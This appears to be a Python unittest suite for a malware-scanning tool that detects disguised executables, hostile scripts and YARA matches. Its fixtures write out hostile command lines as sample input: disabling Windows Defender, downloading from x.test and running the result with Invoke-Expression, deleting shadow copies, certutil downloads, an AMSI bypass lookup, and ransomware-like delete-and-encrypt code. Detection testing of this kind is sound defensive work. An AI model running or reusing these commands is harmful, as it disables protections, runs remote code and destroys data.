import hashlib
import os
import struct
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "backend"))

from app.analyzers.inspector import InspectError, inspect_file  # noqa: E402
from app.analyzers.service import analyze_path  # noqa: E402


def fake_pe() -> bytes:
    h = bytearray(128)
    h[0:2] = b"MZ"
    struct.pack_into("<I", h, 0x3C, 64)
    h[64:68] = b"PE\x00\x00"
    return bytes(h)


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)

    def write(self, name: str, data: bytes) -> str:
        p = os.path.join(self.tmp.name, "f_" + str(abs(hash(name))))
        with open(p, "wb") as f:
            f.write(data)
        return p

    def rule_ids(self, result):
        return {f.rule_id for f in result.findings}


class TestInspector(Base):
    def test_hashes_and_size(self):
        data = b"hello shadowbox\n"
        r = inspect_file(self.write("a.txt", data), original_name="a.txt")
        self.assertEqual(r.sha256, hashlib.sha256(data).hexdigest())
        self.assertEqual(r.md5, hashlib.md5(data).hexdigest())
        self.assertEqual(r.size, len(data))
        self.assertEqual(r.detected.id, "text")

    def test_pe_detected_by_content(self):
        r = inspect_file(self.write("x.exe", fake_pe()), original_name="x.exe")
        self.assertEqual(r.detected.id, "pe")
        self.assertNotIn("executable_disguised", r.signals)

    def test_symlink_rejected(self):
        target = self.write("t.txt", b"x")
        link = os.path.join(self.tmp.name, "lnk")
        try:
            os.symlink(target, link)
        except (OSError, NotImplementedError):
            self.skipTest("symlink không khả dụng")
        with self.assertRaises(InspectError):
            inspect_file(link)


class TestScoring(Base):
    def test_clean_text_has_no_findings(self):
        r = analyze_path(self.write("n.txt", b"ghi chu thong thuong\n"), original_name="notes.txt")
        self.assertEqual(r.score, 0)
        self.assertEqual(r.verdict, "No threats detected")
        self.assertNotIn("safe", r.verdict.lower())
        self.assertTrue(r.disclaimer)

    def test_pe_disguised_as_pdf(self):
        r = analyze_path(self.write("i.pdf", fake_pe()), original_name="invoice.pdf")
        self.assertIn("SB-FILE-001", self.rule_ids(r))
        self.assertEqual(r.score, 30)

    def test_double_extension(self):
        r = analyze_path(self.write("d", fake_pe()), original_name="invoice.pdf.exe")
        self.assertIn("SB-FILE-003", self.rule_ids(r))

    def test_rtl_override_name_escaped(self):
        name = "photo\u202egpj.exe"
        r = analyze_path(self.write("r", fake_pe()), original_name=name)
        self.assertIn("SB-FILE-004", self.rule_ids(r))
        self.assertNotIn("\u202e", r.file["name"])

    def test_text_posing_as_png(self):
        r = analyze_path(self.write("p", b"just text"), original_name="cat.png")
        self.assertIn("SB-FILE-002", self.rule_ids(r))

    def test_malicious_looking_powershell(self):
        script = (
            b"Set-MpPreference -DisableRealtimeMonitoring $true\n"
            b"$c = (New-Object Net.WebClient).DownloadString('http://x.test/a.ps1')\n"
            b"Invoke-Expression $c\n"
            b"powershell -EncodedCommand " + b"QUJD" * 20 + b"\n"
        )
        r = analyze_path(self.write("s.ps1", script), original_name="sample_script.ps1")
        ids = self.rule_ids(r)
        self.assertTrue({"SB-PS-001", "SB-PS-002", "SB-PS-003"} <= ids)
        self.assertGreaterEqual(r.score, 65)
        for f in r.findings:
            self.assertTrue(f.evidence, f"{f.rule_id} thiếu bằng chứng")

    def test_all_match_needs_both_patterns(self):
        r = analyze_path(self.write("o.ps1", b"Invoke-WebRequest http://x.test\n"), original_name="o.ps1")
        self.assertNotIn("SB-PS-001", self.rule_ids(r))

    def test_docm_with_macro(self):
        p = os.path.join(self.tmp.name, "m")
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("word/document.xml", "<w/>")
            z.writestr("word/vbaProject.bin", b"\x00")
        r = analyze_path(p, original_name="report.docm")
        self.assertEqual(r.file["detected"]["id"], "docx")
        self.assertIn("SB-DOC-001", self.rule_ids(r))
        self.assertNotIn("SB-FILE-002", self.rule_ids(r))

    def test_zip_with_script_inside(self):
        p = os.path.join(self.tmp.name, "z")
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("readme.txt", "hi")
            z.writestr("setup.js", "x")
        r = analyze_path(p, original_name="files.zip")
        self.assertIn("SB-ARC-001", self.rule_ids(r))

    def test_score_clamped(self):
        script = (
            b"Set-MpPreference -DisableRealtimeMonitoring $true\n"
            b"IEX (New-Object Net.WebClient).DownloadString('http://x')\n"
            b"schtasks /create /tn x\n"
            b"[Convert]::FromBase64String('a')\n"
        )
        r = analyze_path(self.write("c.ps1", script), original_name="invoice.pdf.ps1")
        self.assertLessEqual(r.score, 100)




class TestScriptAnalyzers(Base):
    def run_script(self, name: str, text: str):
        return analyze_path(self.write(name, text.encode("utf-8")), original_name=name, use_yara=False)

    def test_batch_recovery_inhibition_and_download(self):
        r = self.run_script("run.bat", "@echo off\r\nvssadmin delete shadows /all /quiet\r\ncertutil -urlcache -f http://x.test/a.exe a.exe\r\n")
        ids = self.rule_ids(r)
        self.assertTrue({"SB-BAT-001", "SB-BAT-004"} <= ids)
        self.assertEqual(r.file["metadata"]["script"]["language"], "batch")

    def test_batch_rem_comment_is_ignored(self):
        r = self.run_script("c.cmd", "@echo off\r\nrem vssadmin delete shadows /all\r\n:: schtasks /create /tn x\r\necho hi\r\n")
        self.assertEqual(r.score, 0)

    def test_powershell_comments_are_ignored_and_line_numbers_kept(self):
        text = "# Set-MpPreference -DisableRealtimeMonitoring $true\n<#\nmimikatz\n#>\nSet-MpPreference -DisableIOAVProtection $true\n"
        r = self.run_script("t.ps1", text)
        ids = self.rule_ids(r)
        self.assertIn("SB-PS-002", ids)
        self.assertNotIn("SB-PS-007", ids)
        ev = next(f for f in r.findings if f.rule_id == "SB-PS-002").evidence
        self.assertTrue(ev[0].startswith("L5:"), ev)

    def test_powershell_amsi_bypass(self):
        r = self.run_script("a.ps1", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n")
        self.assertIn("SB-PS-006", self.rule_ids(r))

    def test_python_download_then_exec_needs_both(self):
        both = "import urllib.request, subprocess\nurllib.request.urlretrieve('http://x.test/a','a')\nsubprocess.run(['a'])\n"
        only = "import urllib.request\nurllib.request.urlretrieve('http://x.test/a','a')\n"
        self.assertIn("SB-PY-002", self.rule_ids(self.run_script("d.py", both)))
        self.assertNotIn("SB-PY-002", self.rule_ids(self.run_script("e.py", only)))

    def test_python_ransomware_like_needs_all_three(self):
        code = "import os\nfrom cryptography.fernet import Fernet\nfor r, d, f in os.walk('.'):\n    os.remove(f)\n    Fernet(k).encrypt(b'x')\n"
        self.assertIn("SB-PY-008", self.rule_ids(self.run_script("r.py", code)))

    def test_javascript_wsh_shell(self):
        code = "var sh = new ActiveXObject('WScript.Shell');\nsh.Run('cmd /c calc');\n"
        r = self.run_script("w.js", code)
        self.assertIn("SB-JS-001", self.rule_ids(r))
        self.assertEqual(r.file["metadata"]["script"]["language"], "javascript")

    def test_javascript_block_comment_ignored(self):
        code = "/*\nnew ActiveXObject('WScript.Shell');\n*/\nconsole.log('ok');\n"
        self.assertNotIn("SB-JS-001", self.rule_ids(self.run_script("b.js", code)))

    def test_language_inferred_from_content_for_txt(self):
        text = "Set-MpPreference -DisableRealtimeMonitoring $true\nIEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\n"
        r = self.run_script("New Text Document.txt", text)
        info = r.file["metadata"]["script"]
        self.assertEqual((info["language"], info["language_source"]), ("powershell", "content"))
        self.assertEqual(r.score, 50)

    def test_plain_prose_is_not_treated_as_script(self):
        r = self.run_script("notes.txt", "Hom nay hop nhom luc 9h, nho mang laptop.\n")
        self.assertNotIn("script", r.file["metadata"])
        self.assertEqual(r.score, 0)

    def test_iocs_extracted_without_affecting_score(self):
        r = self.run_script("i.ps1", "Write-Host 'x'\n$u = 'http://evil.test/payload.bin'\n$ip = '203.0.113.7'\n")
        iocs = r.file["metadata"]["script"]["iocs"]
        self.assertIn("http://evil.test/payload.bin", iocs["urls"])
        self.assertIn("203.0.113.7", iocs["ips"])

    def test_every_rule_file_loads_with_unique_ids(self):
        from app.analyzers.scripts import ANALYZERS
        from app.scanners.patterns import load_pattern_rules
        seen = set()
        for a in ANALYZERS:
            for rule in load_pattern_rules(str(a.rules_path())):
                self.assertNotIn(rule.id, seen)
                seen.add(rule.id)
                self.assertGreater(rule.points, 0)


class TestYara(Base):
    def test_findings_from_matches_mapping(self):
        from app.scanners.yara_scan import findings_from_matches
        fs = findings_from_matches([
            {"identifier": "R1", "meta": {"title": "T", "severity": "HIGH", "points": 99, "description": "D"},
             "patterns": [{"id": "$a", "matches": [{"offset": 255, "length": 4}]}]},
            {"identifier": "R2", "meta": {"severity": "weird", "points": "x"}, "patterns": []},
        ])
        self.assertEqual((fs[0].rule_id, fs[0].severity, fs[0].points), ("YARA:R1", "high", 50))
        self.assertEqual(fs[0].evidence, ["$a tại offset 0xff (4 byte)"])
        self.assertEqual((fs[1].severity, fs[1].points), ("medium", 10))
        self.assertTrue(fs[1].evidence)

    def test_yara_rules_dir_has_rules(self):
        from app.core.config import settings
        text = "".join(p.read_text(encoding="utf-8") for p in settings.yara_rules_dir.glob("*.yar"))
        self.assertGreaterEqual(text.count("rule SB_"), 5)

    def test_graceful_when_yara_missing_or_ok(self):
        r = analyze_path(self.write("p.txt", b"hello"), original_name="p.txt")
        status = r.file["metadata"]["yara"]["status"]
        self.assertIn(status, ("ok", "unavailable"))
        if status == "unavailable":
            self.assertEqual(r.score, 0)

    def test_oversize_file_skipped(self):
        from app.scanners import yara_scan
        from app.core.config import settings
        out = yara_scan.scan_file("ignored", settings.yara_max_bytes + 1)
        self.assertEqual(out.info["status"], "skipped_too_large")


def _yara_installed() -> bool:
    try:
        import yara_x  # noqa: F401
        return True
    except ImportError:
        return False


@unittest.skipUnless(_yara_installed(), "cần pip install yara-x")
class TestYaraReal(Base):
    def test_all_shipped_rules_compile(self):
        import yara_x
        from app.core.config import settings
        for f in settings.yara_rules_dir.glob("*.yar"):
            yara_x.compile(f.read_text(encoding="utf-8"))

    def test_eicar_marker_detected(self):
        data = b"X5O!P%@AP[4" + b" filler " + b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
        r = analyze_path(self.write("e.txt", data), original_name="e.txt")
        self.assertEqual(r.file["metadata"]["yara"]["status"], "ok")
        self.assertIn("YARA:SB_Test_Eicar_Marker", self.rule_ids(r))
        f = next(x for x in r.findings if x.rule_id == "YARA:SB_Test_Eicar_Marker")
        self.assertTrue(any("offset 0x" in e for e in f.evidence))

    def test_embedded_pe_in_pdf(self):
        data = b"%PDF-1.4\n" + b"junk" * 10 + b"This program cannot be run in DOS mode" + b"\n%%EOF"
        r = analyze_path(self.write("d.pdf", data), original_name="doc.pdf")
        self.assertIn("YARA:SB_Embedded_PE_In_NonPE", self.rule_ids(r))

    def test_clean_file_has_no_yara_findings(self):
        r = analyze_path(self.write("c.txt", b"nothing to see"), original_name="c.txt")
        self.assertFalse([f for f in r.findings if f.rule_id.startswith("YARA:")])


if __name__ == "__main__":
    unittest.main()
